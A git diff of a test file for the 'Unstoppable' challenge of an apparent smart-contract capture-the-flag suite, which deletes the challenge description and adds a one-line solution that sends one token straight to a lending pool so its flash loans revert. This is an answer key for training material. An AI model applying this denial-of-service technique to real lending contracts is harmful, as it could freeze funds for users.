@@ -17,6 +17,7 @@ describe('[Challenge] Unstoppable', function () {
 			'DamnValuableToken',
 			deployer
 		)
+
 		const UnstoppableLenderFactory = await ethers.getContractFactory(
 			'UnstoppableLender',
 			deployer
@@ -45,25 +46,13 @@ describe('[Challenge] Unstoppable', function () {
 		await this.receiverContract.executeFlashLoan(10)
 	})
 
-	/*
-			There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
-
-			If only there was a way to attack and stop the pool from offering flash loans ...
-
-			You start with 100 DVT tokens in balance.
-
-			IDEAS:
-			- Overflow from borrowAmount
-
-	*/
-
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
+		await this.token.connect(attacker).transfer(this.pool.address, 1)
 	})
 
 	after(async function () {
 		/** SUCCESS CONDITIONS */
-
 		// It is no longer possible to execute flash loans
 		await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted
 	})
